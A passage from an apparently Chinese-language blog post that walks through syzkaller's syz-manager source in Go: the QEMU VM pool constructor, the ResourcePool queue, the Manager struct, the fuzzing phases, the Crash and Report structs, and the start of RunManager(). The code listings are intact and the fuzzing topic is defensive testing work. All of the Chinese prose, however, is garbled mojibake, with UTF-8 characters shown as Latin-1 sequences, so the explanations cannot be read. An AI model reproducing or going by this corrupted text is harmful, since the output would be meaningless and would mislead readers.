ä¸ºä¾‹ï¼Œå…¶åœ¨åŒ…è¢«å¯¼å…¥æ—¶æ³¨å†Œæ„é€ å‡½æ•°ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>LoadData()</code> è§£æé…ç½®æ–‡ä»¶åè¿›è¡Œæ£€æŸ¥ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePoolï¼šVM-èµ„æºæ± é˜Ÿåˆ—">5. ResourcePoolï¼šVM èµ„æºæ± é˜Ÿåˆ—</h3><p>Guest VM çš„èµ„æºè°ƒé…ä¸»è¦æ˜¯é€šè¿‡<code>ResourcePool</code> è¿™ä¸€ç»“æ„æ¥å®Œæˆçš„ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ª <strong>å­˜æ”¾ç©ºé—² VM ã® idx çš„å•å‘é˜Ÿåˆ—ï¼Œå†³å®šäº† VM çš„è°ƒåº¦é¡ºåº</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å®šä¹‰äº†è¿™äº›æ–¹æ³•æ¥æ“çºµèµ„æºæ± é˜Ÿåˆ—ï¼š</p><ul><li><code>Put()</code> ï¼šå‘é˜Ÿåˆ—æœ«å°¾æ·»åŠ ç©ºé—² VM ã® idx</li><li><code>Len()</code> ï¼šè·å–é˜Ÿåˆ—é•¿åº¦</li><li><code>Take()</code>ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡º <code>cnt</code> ä¸ªæˆå‘˜</li><li><code>TakeOne()</code> ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡ºå•ä¸ªæˆå‘˜</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ—¶æœ‰ä¸€ä¸ª <code>SequentialResourcePool()</code> å‡½æ•°ç”¨ä»¥åˆå§‹åŒ–èµ„æºæ± ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…¨å±€ç®¡æ§ç›¸å…³">å…¨å±€ç®¡æ§ç›¸å…³</h2><h3 id="1-Managerï¼šåŸºæœ¬ä¿¡æ¯">1. Managerï¼šåŸºæœ¬ä¿¡æ¯</h3><p><code>Manager</code> ç»“æ„ä½“ç”¨äº<strong>è¡¨ç¤ºä¸€ä¸ª syz-manager çš„åŸºæœ¬ä¿¡æ¯</strong>ï¼Œå®šä¹‰äº <code>syz-manager/manager.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªè¯´æ˜æ¯”è¾ƒå…³é”®çš„å‡ ä¸ªå­—æ®µï¼š</p><ul><li><code>cfg</code>ï¼šåŸºæœ¬è®¾ç½®ä¿¡æ¯ï¼Œå¯¹åº”å­˜æ”¾åœ¨ä¸€ä¸ª json æ–‡ä»¶ä¸­</li><li><code>vmPool</code> ï¼šæ‰€ç”¨çš„ VM Pool</li><li><code>reporter</code>ï¼šç”¨ä»¥æŠ¥å‘Š crash</li><li><code>serv</code> ï¼šRPC Serverï¼Œç”¨ä»¥ä¸ Guest é—´é€šä¿¡</li><li><code>corpusDB</code>ï¼šå­˜æ”¾è¯­æ–™çš„æ•°æ®åº“</li><li><code>targetEnabledSyscalls</code>ï¼šæµ‹è¯•ç”¨ä¾‹æ‰€å…è®¸ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨</li><li><code>candidates</code>ï¼šå¾…æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹</li><li><code>corpus</code>ï¼šè¯­æ–™åº“</li><li><code>seeds</code>ï¼šç”¨æ¥å¯¹è¯­æ–™åº“å˜å¼‚çš„ç§å­</li></ul><h3 id="2-fuzzing-phase">2. fuzzing phase</h3><p><code>syz-manager</code> ä¸­å°† fuzzing æµç¨‹åˆ†ä¸ºå¦‚ä¸‹çš„ä¸åŒé˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// åˆšåˆšå¼€å§‹ï¼Œå•¥éƒ½æ²¡åš.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// åŠ è½½äº†è¯­æ–™åº“ä¸”æ£€æŸ¥äº†æœºå™¨.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// ä»è¯­æ–™åº“ä¸­åˆ†ç±»äº†æ‰€æœ‰è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹æŸ¥è¯¢ hub ä¸æœ€å°åŒ–è¿ç»­è¯­æ–™åº“çš„æ—¶å€™.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// ç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€åˆ°äº† hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// åˆ†ç±»æ‰€æœ‰æ¥è‡ª hub çš„æ–°è¾“å…¥.</span><br><span class="hljs-comment">// è¿™æ˜¯æˆ‘ä»¬å¼€å§‹å¤ç° crashes çš„æ—¶å€™.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-ç»“æœç›¸å…³">Fuzzing ç»“æœç›¸å…³</h2><h3 id="1-Crashï¼šè®°å½•-crash-ä¿¡æ¯">1. Crashï¼šè®°å½• crash ä¿¡æ¯</h3><p><code>manager.go</code> ä¸­å®šä¹‰äº†<code>Crash</code> ç»“æ„ä½“ç”¨ä»¥è®°å½•äº§ç”Ÿ crash çš„ VMã€æœºå™¨ä¿¡æ¯ç­‰ï¼Œ<strong>çœŸæ­£çš„ crash ä¿¡æ¯ä¸»è¦å­˜æ”¾åœ¨ä¸€ä¸ª <code>Report</code> ç»“æ„ä½“ä¸­</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š">2. Reportï¼šå•æ¬¡æ‰§è¡Œç»“æœæŠ¥å‘Š</h3><p><code>pkg/report/rteport.go</code> ä¸­çš„ <code>Report</code> ç»“æ„ä½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡æ‰§è¡Œçš„ç»“æœï¼ŒåŒ…æ‹¬æ˜¯å¦äº§ç”Ÿäº† crashã€Oops çš„ä¿¡æ¯ç­‰ç­‰ï¼š</p><ul><li><p><code>Title</code>ï¼š<strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œç”¨æ¥æ ‡è¯†ç‰¹å®šç±»å‹çš„ crash</strong></p><blockquote><p>ä¾‹å¦‚ <code>BUG: unable to handle page fault for address: ffffffff81001619</code> è¿™æ ·çš„</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1>0x02. main()ï¼šåŠ è½½é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ manager</h1><p><code>syz-manager</code> çš„ <code>main()</code> å‡½æ•°å…¶å®æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯è½½å…¥é…ç½®æ–‡ä»¶ä¿¡æ¯å¹¶è°ƒç”¨ <code>RunManager()</code> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><s>ğŸ‘´å¯»æ€å¥½åƒæ²¡ä»€ä¹ˆå¥½è¯´çš„</s></p></blockquote><h1>0x03. RunManager()ï¼šè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ</h1><h3 id="Step-1-åˆå§‹åŒ–-VM-Pool">Step 1. åˆå§‹åŒ– VM Pool</h3><p>é¦–å…ˆæ˜¯åˆå§‹åŒ– VM Poolï¼Œè¿™é‡Œè°ƒç”¨äº† <code>vm/vm.go</code> ä¸­çš„ <code>Create()</code> æ¥å®Œæˆ VM pool çš„åˆ›å»º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; ç±»å‹å¯¹äºè°ƒè¯•/å¼€å‘è€Œè¨€æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œmanager å¹¶ä¸ä¼šå¯åŠ¨ä»»ä½• VMï¼Œ</span><br>   <span class="hljs-comment">// ä½†ç›¸åº”çš„æ˜¯ä½ åº”å½“æ‰‹åŠ¨å¯åŠ¨ VM å¹¶åœ¨æ­¤å¯åŠ¨ syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è·å– VM ç±»å‹ã€å°è£…ä¸€ä¸ª Env ç»“æ„ä½“ã€è°ƒç”¨å¯¹åº”ç±»å‹ VM Pool çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create åˆ›å»ºä¸€ä¸ªå¯ç”¨äºåˆ›å»ºç‹¬ç«‹ VMs çš„ VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span 